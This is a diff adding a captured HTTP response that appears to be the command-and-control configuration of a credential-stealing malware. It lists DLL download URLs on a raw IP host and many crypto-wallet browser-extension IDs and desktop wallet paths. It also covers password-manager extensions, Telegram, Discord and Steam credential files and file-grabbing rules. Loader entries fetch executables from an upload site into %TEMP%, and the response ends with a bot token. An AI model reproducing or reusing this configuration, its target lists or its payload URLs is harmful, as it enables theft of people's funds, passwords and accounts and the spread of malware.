@@ -1,0 +1,127 @@
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 14 Oct 2022 03:08:02 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7460
+Connection: keep-alive
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+Content-Security-Policy: default-src 'self';base-uri 'self';block-all-mixed-content;font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
+Cross-Origin-Embedder-Policy: require-corp
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+X-DNS-Prefetch-Control: off
+Expect-CT: max-age=0
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=15552000; includeSubDomains
+X-Download-Options: noopen
+X-Content-Type-Options: nosniff
+Origin-Agent-Cluster: ?1
+X-Permitted-Cross-Domain-Policies: none
+Referrer-Policy: no-referrer
+X-XSS-Protection: 0
+ETag: W/"1d24-zjhEf96nQft0hoKomtZJSzK9kok"
+
+libs_nss3:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/nss3.dll
+libs_msvcp140:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/msvcp140.dll
+libs_vcruntime140:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/vcruntime140.dll
+libs_mozglue:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/mozglue.dll
+libs_freebl3:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/freebl3.dll
+libs_softokn3:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/softokn3.dll
+ews_meta_e:ejbalbakoplchlghecdalmeeeajnimhm;MetaMask;Local Extension Settings
+ews_tronl:ibnejdfjmmkpcnlpebklmnkoeoihofec;TronLink;Local Extension Settings
+libs_sqlite3:http://45.15.156.31/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.dll
+ews_bsc:fhbohimaelbohpjbbldcngcnapndodjp;BinanceChain;Local Extension Settings
+ews_ronin:fnjhmkhhmkbjkkabndcnnogagogbneec;Ronin;Local Extension Settings
+wlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dictionar*
+wlts_atomic:Atomic;26;atomic;*;*cache*,*IndexedDB*
+wlts_jaxxl:JaxxLiberty;26;com.liberty.jaxx;*;*cache*
+wlts_binance:Binance;26;Binance;*app-store.*,*.fp;-
+wlts_coinomi:Coinomi;28;Coinomi\Coinomi\wallets;*;-
+wlts_electrum:Electrum;26;Electrum\wallets;*;-
+wlts_elecltc:Electrum-LTC;26;Electrum-LTC\wallets;*;-
+wlts_elecbch:ElectronCash;26;ElectronCash\wallets;*;-
+wlts_guarda:Guarda;26;Guarda;*;*cache*,*IndexedDB*
+wlts_green:BlockstreamGreen;28;Blockstream\Green;*;cache,gdk,*logs*
+wlts_ledger:Ledger Live;26;Ledger Live;*;*cache*,*dictionar*,*sqlite*
+ews_ronin_e:kjmoohlgokccodicjjfebfomlbljgfhk;Ronin;Local Extension Settings
+ews_meta:nkbihfbeogaeaoehlefnkodbefgpgknn;MetaMask;Local Extension Settings
+sstmnfo_System Info.txt:System Information: 
+|Installed applications:
+|
+wlts_daedalus:Daedalus;26;Daedalus Mainnet;*;log*,*cache,chain,dictionar*
+wlts_mymonero:MyMonero;26;MyMonero;*;*cache*
+wlts_xmr:Monero;5;Monero\\wallets;*.keys;-
+wlts_wasabi:Wasabi;26;WalletWasabi\\Client;*;*tor*,*log*
+ews_metax:mcohilncbfahbmgdjkbpemcciiolgcge;MetaX;Local Extension Settings
+ews_xdefi:hmeobnfnfcmdkdcmlblgagmfpfboieaf;XDEFI;IndexedDB
+ews_waveskeeper:lpilbniiabackdjcionkobglmddfbcjo;WavesKeeper;Local Extension Settings
+ews_solflare:bhhhlbepdkbapadjdnnojkbgioiodbic;Solflare;Local Extension Settings
+ews_rabby:acmacodkjbdgmoleebolmdjonilkdbch;Rabby;Local Extension Settings
+ews_cyano:dkdedlpgdmmkkfjabffeganieamfklkm;CyanoWallet;Local Extension Settings
+ews_coinbase:hnfanknocfeofbddgcijnmhnfnkdnaad;Coinbase;IndexedDB
+ews_auromina:cnmamaachppnkjgnildpdmkaakejnhae;AuroWallet;Local Extension Settings
+ews_khc:hcflpincpppdclinealmandijcmnkbgn;KHC;Local Extension Settings
+ews_tezbox:mnfifefkajgofkcjkemidiaecocnkjeh;TezBox;Local Extension Settings
+ews_coin98:aeachknmefphepccionboohckonoeemg;Coin98;Local Extension Settings
+ews_temple:ookjlbkiijinhpmnjffcofjonbfbgaoc;Temple;Local Extension Settings
+ews_iconex:flpiciilemghbmfalicajoolhkkenfel;ICONex;Local Extension Settings
+ews_sollet:fhmfendgdocmcbmfikdcogofphimnkno;Sollet;Local Extension Settings
+ews_clover:nhnkbkgjikgcigadomkphalanndcapjk;CloverWallet;Local Extension Settings
+ews_polymesh:jojhfeoedkpkglbfimdfabpdfjaoolaf;PolymeshWallet;Local Extension Settings
+ews_neoline:cphhlgmgameodnhkjdmkpanlelnlohao;NeoLine;Local Extension Settings
+ews_keplr:dmkamcknogkgcdfhhbddcghachkejeap;Keplr;Local Extension Settings
+ews_terra_e:ajkhoeiiokighlmdnlakpjfoobnjinie;TerraStation;Local Extension Settings
+ews_terra:aiifbnbfobpmeekipheeijimdpnlpgpp;TerraStation;Local Extension Settings
+ews_liquality:kpfopkelmapcoipemfendmdcghnegimn;Liquality;Local Extension Settings
+ews_saturn:nkddgncdjgjfcddamfgcmfnlhccnimig;SaturnWallet;Local Extension Settings
+ews_guild:nanjmdknhkinifnkgdcggcfnhdaammmj;GuildWallet;Local Extension Settings
+ews_phantom:bfnaelmomeimhlpmgjnjophhpkkoljpa;Phantom;Local Extension Settings
+ews_tronlink:ibnejdfjmmkpcnlpebklmnkoeoihofec;TronLink;Local Extension Settings
+ews_brave:odbfpeeihdkbihmopkbjmoonfanlbfcl;Brave;Local Extension Settings
+ews_meta_e:ejbalbakoplchlghecdalmeeeajnimhm;MetaMask;Local Extension Settings
+ews_ronin_e:kjmoohlgokccodicjjfebfomlbljgfhk;Ronin;Local Extension Settings
+ews_mewcx:nlbmnnijcnlegkjjpcfjclmcfggfefdm;MEW_CX;Sync Extension Settings
+ews_ton:cgeeodpfagjceefieflmdfphplkenlfk;TON;Local Extension Settings
+ews_goby:jnkelfanjkeadonecabehalmbgpfodjm;Goby;Local Extension Settings
+ews_ton_ex:nphplpgoakhhjchkkhmiggakijnkhfnd;TON;Local Extension Settings
+ews_Cosmostation:fpkhgmpbidmiogeglndfbkegfdlnajnf;Cosmostation;Local Extension Settings
+ews_bitkeep:jiidiaalihmmhddjgbnbgdfflelocpak;BitKeep;Local Extension Settings
+ews_stargazer:pgiaagfkgcbnmiiolekcfmljdagdhlcm;Stargazer;Local Extension Settings
+ews_clv:nhnkbkgjikgcigadomkphalanndcapjk;CloverWallet;Local Extension Settings
+ews_jaxxlibertyext:cjelfplplebdjjenllpjcblmjkfcffne;JaxxLibertyExtension;Local Extension Settings
+ews_enkrypt:kkpllkodjeloidieedojogacfhpaihoh;Enkrypt;Local Extension Settings
+ews_gamestop:pkkjjapmlcncipeecdmlhaipahfdphkd;GameStop Wallet;Local Extension Settings
+ews_xds:aholpfdialjgjfhomihkjbmgjidlcdno;Exodus Web3 Wallet;Local Extension Settings
+xtntns_authenticatorcc:bhghoamapcdpbohphigoooaddinpkbai;Authenticator.cc;Sync Extension Settings
+xtntns_keepassxc_browser:oboonakemofpalcgghocfoadofidjkkk;KeePassXC Browser;Local Extension Settings
+xtntns_keepassTusk:fmhmiaejopepamlcjkncpgpdjichnecm;KeePass Tusk;Local Extension Settings
+xtntns_bitwardenEx:nngceckbapebfimnlniiiahkandclblb;Bitwarden;Local Extension Settings
+xtntns_microsoftAfL:fiedbfgcleddlbcmgdigjgdfcggjcion;Microsoft Autofill Local;Local Extension Settings
+xtntns_microsoftAfS:fiedbfgcleddlbcmgdigjgdfcggjcion;Microsoft Autofill Sync;Sync Extension Settings
+ews_martian:efbglgofoippbgcjepnhiblaibcnclgk;Martian Aptos;Local Extension Settings
+ews_braavos_c:jnlgamecbpmbajjfhmmmlhejkemejdma;Braavos;Local Extension Settings
+ews_okx_c:mcohilncbfahbmgdjkbpemcciiolgcge;OKX;Local Extension Settings
+ews_pontem_c:phkbamefinggmakgklpkljjmgibohnba;Pontem Aptos;Local Extension Settings
+ews_sender_c:epapihdplajcdnnkdeiahlgigofloibg;SenderWallet;Local Extension Settings
+ews_hashpack_c:gjagmgiddbbciopjhllkdnddhcglnemk;Hashpack;Local Extension Settings
+ews_ever_c:cgeeodpfagjceefieflmdfphplkenlfk;EVER;Local Extension Settings
+ews_finnie_c:cjmkndjhnagcfbpiemnkdpomccnjblmj;Finnie;Local Extension Settings
+ews_leap_terra_c:aijcbedoijmgnlmjeegjaglmepbmpkpi;LeapTerra;Local Extension Settings
+ews_petra_atos_c:ejjladinnckdgjemekebdpeokbikhfci;Petra Aptos;Local Extension Settings
+ews_eternl_c:kmhcihpebfmpgmihbkipmjlmmioameka;Eternl;Local Extension Settings
+ews_gero_wlt_c:bgpipimickeadkjlklgciifhnalhdjhe;GeroWallet;Local Extension Settings
+ews_Nami:lpfcbjknijpeeillifnkikgncikgfhdo;Nami Wallet;Local Extension Settings
+tlgrm_Telegram:Telegram Desktop\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*
+dscrd_Discord:discord\Local Storage\leveldb|*.log,*.ldb|-
+grbr_Desctop:%USERPROFILE%\Desktop\|*.txt|*recycle*,*windows*|10|1|1|files
+grbr_Documents:%USERPROFILE%\Documents\|*.txt|*recycle*,*windows*|10|1|1|files
+grbr_Recent:%APPDATA%\Microsoft\Windows\Recent\|*.txt|*recycle*,*windows*|10|1|1|files
+grbr_Steam:%PROGRAMFILES(x86)%\Steam\|loginusers.vdf|-|1024|1|1|files
+grbr_Binance:%appdata%/binance|*.fp|-|50|0|0|files
+ldr_1:https://dl.uploadgram.me/6345a5f86df93h?raw|%TEMP%\|exe
+ldr_1:https://dl.uploadgram.me/63485a4eaa29ch?raw|%TEMP%\|exe
+ldr_1:https://dl.uploadgram.me/6342cf831fef4h?raw|%TEMP%\|exe
+ldr_1:https://dl.uploadgram.me/6346a7db34fe0h?raw|%TEMP%\|exe
+token:01768c9a1ed7c851d917152cc4b2a8b3
